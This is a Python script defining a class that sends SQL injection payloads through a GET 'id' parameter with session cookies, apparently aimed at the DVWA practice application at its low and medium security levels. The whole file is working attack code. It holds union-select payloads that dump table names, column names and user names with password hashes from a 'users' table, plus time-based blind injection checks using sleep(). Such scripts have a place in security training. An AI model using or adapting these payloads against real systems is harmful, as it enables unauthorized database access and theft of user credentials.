import requests
import json
from urllib.parse import urlencode, quote_plus

class sqli:
	def __init__(self, url, phpsessid, security):
		self.url = url
		self.phpsessid = phpsessid
		self.security = security
	
	def sendReq(self, injection):
		payload = {'id':"%s" % (injection)}
		id = urlencode(payload, quote_via=quote_plus)
		url = self.url + "?" + id + "&Submit=Submit#"
		header = {'Cookie':"PHPSESSID=%s; security=%s" % (self.phpsessid, self.security)}
		req = requests.get(url, headers=header)

		return req.content

	def sqli_check(self):
		injection = "'"
		return self.sendReq(injection)

	def dumpTableNameLow(self):
		injection = "-1' or 1=1 union select table_schema, table_name from information_schema.tables #"
		return self.sendReq(injection)

	def dumpColumnNameLow(self):
		injection = "-1' or 1=1 union select table_name, column_name from information_schema.columns #"
		return self.sendReq(injection)

	def dumpUsernamePasswdLow(self):
		injection = "-1' or 1=1 union select first_name, password from users #"
		return self.sendReq(injection)

	def dumpUsernamePasswdMed(self):
		injection = "-1 or 1=1 union select first_name, password from users"
		return self.sendReq(injection)

	def sqli_blind_check(self):
		injection = "-1' or sleep(1) #"
		return self.sendReq(injection)

	def sqli_blind_dumpUsernamePasswdLow(self):
		injection = "-1' or 1=1 union select first_name, password from users #"
		return self.sendReq(injection)
	
	def sqli_blind_check_med(self):
		injection = "-1 or sleep(1) #"
		return self.sendReq(injection)

	def sqli_blind_dumpUsernamePasswdMed(self):
		injection = "-1 or 1=1 union select first_name, password from users #"
		return self.sendReq(injection)	
